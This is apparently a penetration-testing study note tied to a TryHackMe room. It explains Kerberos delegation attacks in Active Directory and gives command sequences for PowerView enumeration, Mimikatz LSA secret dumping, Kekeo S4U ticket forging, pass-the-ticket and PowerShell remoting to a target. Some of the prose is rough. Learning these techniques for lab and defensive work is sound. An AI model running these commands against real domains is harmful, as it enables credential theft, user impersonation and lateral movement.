# Active Directory Kerberos Delegation Exploitation

## Introduction

For [[Attacking-Kerberos]] and [[Active-Directory-Kerberos-Authentication-Defined]]

Kerberos Delegation can be used to is to enable an application to access resources hosted on a different server, without Kerberos Delegation we need a AD Service Account and provide it directit or have in innately have direct access to the target resource. With delegation the service account can be delegated to the target resource and interact with it on the behalf of the user able to delegate to the exploited Kerberos delegation victim. This process is visually represented below:

1. Current Context ---> Access ---> Victim x-x-x-x-No Access-x-x-x-x Target Resource
2. Current Context ---> Kerberos Delegation ---> Victim ---> Access Via Delegated to ---> Target Resource

## Constrained Vs Unconstrained

Unconstrained delegation is the original implementation that Microsoft later superceded with Constrained Delegation in 2003. 

- **Unconstrained**

[Unconstrain Delegation](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976)  provides no limits to the delegation, if a user with the `"TRUSTED_FOR_DELEGATION"` flag set authenticates to a host with Unconstrained Delegation configured, a ticket-granting ticket (TGT) for that user account is generated and stored in memory. Therefore we could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service. 
[article](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976)

- **Constrained**

To make this less over-powered and remediate security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. These are service, HOST for accounts, CIFS - Common Internet File System-based or based on one of allowed [[Network-Protocols]] within the AD Domain. With [[PowerView-Cheatsheet]] remember to `import-module`...

```powershell
Get-NetUser -TrustedToAuth
# Look at msds-allowedtodelegateto 
```

Dependent on your current context, Domain layout and attack path objectives.  Understanding the connective mechanism between machines in AD is key as the [[Network-Protocols]]. Usage of either legitimate Windows variants of or the any of the [[Impacket-Cheatsheet]] relevant, like for WinRM (but not Impacket) [[Evil-winrm-Cheatsheet]]. With Administrative Access [[Mimikatz-Cheatsheet]] to harvest credentials and tokens; [[Kekeo-Cheatsheet]] to generate tickets.

Get a service username and password with Mimkatz
```powershell
# mimikatz.exe
token::elevate
!+ # LSA protection bypass!
lsdump::secrets
```

Generate TGT tickets with Kekeo -- [[Kekeo-Cheatsheet]]
**FOR SOME SERVICE REQUIRE MULTIPLE TICKETS**

Method | Protocols
--- | ---
PS Remoting | http wsman

```powershell
# kekeo.exe
tgt::ask /user:<svc-user> /domain:<domain> /password:<password>
# Successful output will have:
> Ticket in file 'tgt_filename'
# Do for each $PROTOCOL required!
tgs::s4u /tgt:'tgt_filename' /user:<impersonation-target> /service:$PROTOCOL/<service>
# Successful output will have:
> Ticket in file 'TGS_...'
# Double check which remoting services need which protocol and forge for each service
```

Import tickets with Mimikatz
```powershell
# mimikatz.exe
privilege::debug
!+ # LSA protection bypass!
# Use TGS file(S) from kekeo
kerberos::ptt $TGS_Filename_beware_of_clipboard_newlines_or_carraige_return
# Successful output:
* File:
'TGS_*....'
OK
```

The Powershell remote into the next server/workstation:
```powershell
klist # Show imported Tickets
New-PSSession -ComputerName <target>.<domain>
Enter-PSSession -ComputerName <target>.<domain>
```


- **Resource-Based Contrained Delegation**

Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. The service now specifies which objects can delegate to it allowing the service owner to control who can access it. If we have permissions to configure RBCD for a service we have ability to set `msDS-AllowedToActOnBehalfOfOtherIdentity`. populating it with currently control account then we can generate a TGT for the account we control, which will allow us to interact with this service see this article for more [Resource-based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/).


## References

[THM Room Exploiting AD](https://tryhackme.com/room/exploitingad)
[Unconstrain Delegation Medium Blog](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976)
[Resource-based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)